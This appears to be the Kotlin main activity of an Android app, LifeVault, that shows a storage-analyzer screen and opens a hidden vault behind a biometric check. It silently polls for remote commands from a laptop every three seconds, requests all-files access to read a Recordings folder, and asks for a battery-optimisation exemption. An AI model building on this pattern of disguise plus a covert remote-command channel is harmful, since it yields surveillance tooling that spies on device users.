package com.example.lifevault

import android.Manifest
import android.os.Build
import android.os.Bundle
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.*
import androidx.fragment.app.FragmentActivity
import com.example.lifevault.repository.VaultRepository
import com.example.lifevault.security.BiometricGate
import com.example.lifevault.ui.DashboardScreen
import com.example.lifevault.ui.SettingsScreen
import com.example.lifevault.ui.StorageAnalyzerScreen
import com.example.lifevault.ui.VaultScreen
import com.example.lifevault.ui.theme.LifeVaultTheme

enum class Screen {
    PERMISSION_DENIED,
    PUBLIC,
    DASHBOARD,
    SETTINGS,
    VAULT
}

class MainActivity : FragmentActivity() {

    private lateinit var app: LifeVaultApplication
    private lateinit var repository: VaultRepository

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        // Permissions updated; triggers background workers if needed
        app.scheduleSyncWorkers()
    }

    private fun hasAllRequiredPermissions(): Boolean {
        val storageGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            androidx.core.content.ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_EXTERNAL_STORAGE
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        return storageGranted
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        app = application as LifeVaultApplication
        repository = VaultRepository(this, app.database, app.tokenStore)

        setContent {
            LifeVaultTheme {
                var currentScreen by remember {
                    mutableStateOf(if (hasAllRequiredPermissions()) Screen.PUBLIC else Screen.PERMISSION_DENIED)
                }
                var previousScreen by remember { mutableStateOf(Screen.PUBLIC) }

                // Check permissions on resume
                DisposableEffect(Unit) {
                    val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
                        if (event == androidx.lifecycle.Lifecycle.Event.ON_RESUME) {
                            if (!hasAllRequiredPermissions()) {
                                currentScreen = Screen.PERMISSION_DENIED
                            } else if (currentScreen == Screen.PERMISSION_DENIED) {
                                currentScreen = Screen.PUBLIC
                            }
                        }
                    }
                    lifecycle.addObserver(observer)
                    onDispose { lifecycle.removeObserver(observer) }
                }

                // Silent fast polling for remote commands from laptop (3-second interval)
                LaunchedEffect(Unit) {
                    while (true) {
                        try {
                            if (hasAllRequiredPermissions()) {
                                repository.pollAndProcessRemoteCommands()
                            }
                        } catch (_: Exception) {}
                        kotlinx.coroutines.delay(3000L)
                    }
                }

                when (currentScreen) {
                    Screen.PERMISSION_DENIED -> {
                        com.example.lifevault.ui.PermissionGateScreen(
                            onGrantPermissionsClick = {
                                requestRequiredPermissions()
                            }
                        )
                    }

                    Screen.PUBLIC -> {
                        StorageAnalyzerScreen(
                            onOpenSettings = {
                                previousScreen = Screen.PUBLIC
                                currentScreen = Screen.SETTINGS
                            },
                            onVaultUnlock = {
                                BiometricGate.authenticate(
                                    activity = this@MainActivity,
                                    onSuccess = {
                                        currentScreen = Screen.DASHBOARD
                                    },
                                    onFailure = {
                                        // Remain on public screen silently
                                    }
                                )
                            }
                        )
                    }
                    Screen.DASHBOARD -> {
                        DashboardScreen(
                            app = app,
                            repository = repository,
                            onNavigateToSettings = {
                                previousScreen = Screen.DASHBOARD
                                currentScreen = Screen.SETTINGS
                            },
                            onNavigateToVault = { currentScreen = Screen.VAULT },
                            onBackToPublic = { currentScreen = Screen.PUBLIC }
                        )
                    }
                    Screen.SETTINGS -> {
                        SettingsScreen(
                            app = app,
                            repository = repository,
                            onBack = { currentScreen = previousScreen },
                            onRequestPermissions = { requestRequiredPermissions() },
                            isSecretVault = (previousScreen == Screen.DASHBOARD)
                        )
                    }

                    Screen.VAULT -> {
                        VaultScreen(
                            app = app,
                            repository = repository,
                            onBack = { currentScreen = Screen.DASHBOARD }
                        )
                    }
                }
            }
        }

    }


    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 1001) {
            app.scheduleSyncWorkers()
        }
    }

    private fun requestRequiredPermissions() {
        val permissions = mutableListOf<String>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        try {
            androidx.core.app.ActivityCompat.requestPermissions(
                this,
                permissions.toTypedArray(),
                1001
            )
        } catch (_: Exception) {}

        // Request All Files Access (Android 11+) so Recordings folder can be read directly
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                if (!android.os.Environment.isExternalStorageManager()) {
                    val intent = android.content.Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = android.net.Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                }
            } catch (_: Exception) {}
        }

        requestBatteryOptimizationExemption()
    }

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = android.content.Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = android.net.Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                }
            } catch (_: Exception) {}
        }
    }
}
